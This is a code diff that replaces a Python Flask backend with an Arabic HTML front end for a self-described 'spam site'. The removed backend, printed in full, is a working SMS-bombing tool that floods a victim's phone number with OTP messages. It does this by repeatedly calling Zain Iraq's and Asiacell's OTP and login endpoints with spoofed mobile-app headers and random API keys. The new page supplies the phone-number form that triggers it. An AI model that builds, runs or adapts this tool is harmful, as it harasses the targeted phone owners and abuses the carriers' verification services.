@@ -1,253 +1,100 @@
-from flask import Flask, render_template, request, jsonify
-import requests
-import time
-import threading
-from uuid import uuid4
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع سبام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+        input, select, button {
+            padding: 10px;
+            margin: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            width: 200px;
+        }
+        button {
+            background-color: #28a745;
+            color: white;
+            cursor: pointer;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>مرحبًا بكم في موقع سبام</h1>
+        <input type="text" id="phone" placeholder="أدخل رقم الهاتف">
+        <input type="number" id="count" placeholder="عدد المرات (1-50)">
+        <select id="type">
+            <option value="ethir">سبام اثير</option>
+            <option value="asia">سبام اسيا</option>
+        </select>
+        <button id="startBtn" onclick="startSpam()">بدء الإرسال</button>
+        <button id="stopBtn" onclick="stopSpam()" disabled>إيقاف الإرسال</button>
+        <p id="status"></p>
+    </div>
 
-# Initialize Flask app
-app = Flask(__name__)
-
-# Global variables for spam control
-spam_control = {
-    'stop': False,
-    'current_type': None,
-    'active_thread': None
-}
-
-# Helper function for API requests
-def make_api_request(url, headers, data, phone_number, count, total, service_name):
-    try:
-        response = requests.post(url, headers=headers, json=data)
-        if response.status_code == 200 and 'success' in response.text.lower():
-            print(f"تم إرسال سبام {service_name} بنجاح إلى الرقم: {phone_number} - الطلب: {count}/{total}")
-            return True
-        else:
-            print(f"فشل في إرسال سبام {service_name}. كود الحالة: {response.status_code}")
-            return False
-    except Exception as e:
-        print(f"حدث خطأ في {service_name}: {str(e)}")
-        return False
-
-# Spam functions
-def send_ethir_spam(phone_number, spam_count):
-    headers = {
-        'Host': 'mw-mobileapp.iq.zain.com',
-        'Accept': '*/*',
-        'Content-Type': 'application/json',
-        'User-Agent': 'Zain Iraq iq.zain/3.10 Coder',
-        'Connection': 'close'
-    }
-    data = {'msisdn': phone_number, 'user_space': 'mbb'}
-    
-    for count in range(1, spam_count + 1):
-        if spam_control['stop']:
-            break
+    <script>
+        async function startSpam() {
+            const phone = document.getElementById('phone').value;
+            const count = document.getElementById('count').value;
+            const type = document.getElementById('type').value;
             
-        success = make_api_request(
-            'https://mw-mobileapp.iq.zain.com/api/otp/request',
-            headers, data, phone_number, count, spam_count, 'اثير'
-        )
-        
-        if not success:
-            break
-            
-        time.sleep(1)
-
-def send_asia_spam(phone_number, spam_count):
-    headers = {
-        'X-ODP-API-KEY': str(uuid4()),
-        'DeviceID': str(uuid4()),
-        'X-OS-Version': '13',
-        'X-Device-Type': '[Android][heros][heros-LX2 13] [TIRAMISU]',
-        'X-ODP-APP-VERSION': '3.8.0',
-        'X-FROM-APP': 'odp',
-        'X-ODP-CHANNEL': 'mobile',
-        'X-SCREEN-TYPE': 'MOBILE',
-        'Cache-Control': 'private, max-age=240',
-        'Content-Type': 'application/json; charset=UTF-8',
-        'Content-Length': '43',
-        'Host': 'odpapp.asiacell.com',
-        'Connection': 'Keep-Alive',
-        'Accept-Encoding': 'gzip',
-        'User-Agent': 'okhttp/5.0.0-alpha.2',
-    }
-    data = {"captchaCode": "", "username": phone_number}
-    
-    for count in range(1, spam_count + 1):
-        if spam_control['stop']:
-            break
-            
-        success = make_api_request(
-            'https://odpapp.asiacell.com/api/v1/login?lang=ar',
-            headers, data, phone_number, count, spam_count, 'اسيا'
-        )
-        
-        if not success:
-            break
-            
-        time.sleep(1)
-
-# Flask routes
-@app.route('/')
-def home():
-    return '''
-    <!DOCTYPE html>
-    <html lang="ar">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>موقع سبام</title>
-        <style>
-            body {
-                font-family: Arial, sans-serif;
-                text-align: center;
-                background-color: #f4f4f4;
-                padding: 50px;
-            }
-            h1 {
-                color: #333;
-            }
-            .container {
-                background: #fff;
-                padding: 20px;
-                border-radius: 10px;
-                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-                display: inline-block;
-                max-width: 500px;
-                width: 90%;
-            }
-            input, select, button {
-                padding: 12px;
-                margin: 10px 0;
-                border: 1px solid #ddd;
-                border-radius: 5px;
-                width: 100%;
-                box-sizing: border-box;
-            }
-            button {
-                background-color: #28a745;
-                color: white;
-                cursor: pointer;
-                font-weight: bold;
-                transition: background-color 0.3s;
-            }
-            button:hover {
-                background-color: #218838;
-            }
-            button:disabled {
-                background-color: #6c757d;
-                cursor: not-allowed;
-            }
-            #status {
-                margin-top: 15px;
-                min-height: 20px;
-                color: #333;
-            }
-            @media (max-width: 600px) {
-                body {
-                    padding: 20px;
-                }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>مرحبًا بكم في موقع سبام</h1>
-            <input type="text" id="phone" placeholder="أدخل رقم الهاتف" pattern="[0-9]+" required>
-            <input type="number" id="count" placeholder="عدد المرات (1-50)" min="1" max="50" required>
-            <select id="type">
-                <option value="ethir">سبام اثير</option>
-                <option value="asia">سبام اسيا</option>
-            </select>
-            <button id="startBtn" onclick="startSpam()">بدء الإرسال</button>
-            <button id="stopBtn" onclick="stopSpam()" disabled>إيقاف الإرسال</button>
-            <p id="status"></p>
-        </div>
-
-        <script>
-            function updateUI(startDisabled, stopDisabled, statusText) {
-                document.getElementById('startBtn').disabled = startDisabled;
-                document.getElementById('stopBtn').disabled = stopDisabled;
-                document.getElementById('status').innerText = statusText || "";
+            if (!phone || !count || count < 1 || count > 50) {
+                alert("يرجى إدخال رقم هاتف صحيح وعدد مرات بين 1 و 50.");
+                return;
             }
 
-            async function startSpam() {
-                const phone = document.getElementById('phone').value.trim();
-                const count = parseInt(document.getElementById('count').value);
-                const type = document.getElementById('type').value;
-                
-                if (!phone || isNaN(count) || count < 1 || count > 50) {
-                    alert("يرجى إدخال رقم هاتف صحيح وعدد مرات بين 1 و 50.");
-                    return;
-                }
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('status').innerText = "جاري الإرسال...";
 
-                updateUI(true, false, "جاري الإرسال...");
+            const response = await fetch('/start_spam', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ phone, count, type }),
+            });
 
-                try {
-                    const response = await fetch('/start_spam', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ phone, count, type }),
-                    });
-                    
-                    const result = await response.json();
-                    updateUI(result.status !== 'success', result.status === 'success', result.message);
-                } catch (error) {
-                    updateUI(false, true, "حدث خطأ في الاتصال بالخادم");
-                }
-            }
+            const result = await response.json();
+            document.getElementById('status').innerText = result.message;
+        }
 
-            async function stopSpam() {
-                updateUI(true, true, "جاري الإيقاف...");
+        async function stopSpam() {
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('status').innerText = "جاري الإيقاف...";
 
-                try {
-                    const response = await fetch('/stop_spam', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                    });
-                    
-                    const result = await response.json();
-                    updateUI(false, true, result.message);
-                } catch (error) {
-                    updateUI(true, false, "حدث خطأ في إيقاف العملية");
-                }
-            }
-        </script>
-    </body>
-    </html>
-    '''
+            const response = await fetch('/stop_spam', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+            });
 
-@app.route('/start_spam', methods=['POST'])
-def start_spam():
-    data = request.json
-    phone_number = data['phone']
-    spam_count = int(data['count'])
-    spam_type = data['type']
-    
-    # Validate input
-    if not phone_number or spam_count < 1 or spam_count > 50:
-        return jsonify({"status": "error", "message": "بيانات غير صالحة"})
-    
-    # Reset spam control
-    spam_control['stop'] = False
-    spam_control['current_type'] = spam_type
-    
-    # Start the appropriate spam function in a new thread
-    target_function = send_ethir_spam if spam_type == 'ethir' else send_asia_spam
-    spam_control['active_thread'] = threading.Thread(
-        target=target_function,
-        args=(phone_number, spam_count)
-    )
-    spam_control['active_thread'].start()
-    
-    return jsonify({"status": "success", "message": "بدأ إرسال السبام."})
-
-@app.route('/stop_spam', methods=['POST'])
-def stop_spam():
-    spam_control['stop'] = True
-    if spam_control['active_thread'] and spam_control['active_thread'].is_alive():
-        spam_control['active_thread'].join(timeout=1)
-    return jsonify({"status": "success", "message": "تم إيقاف السبام."})
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+            const result = await response.json();
+            document.getElementById('status').innerText = result.message;
+        }
+    </script>
+</body>
+</html>
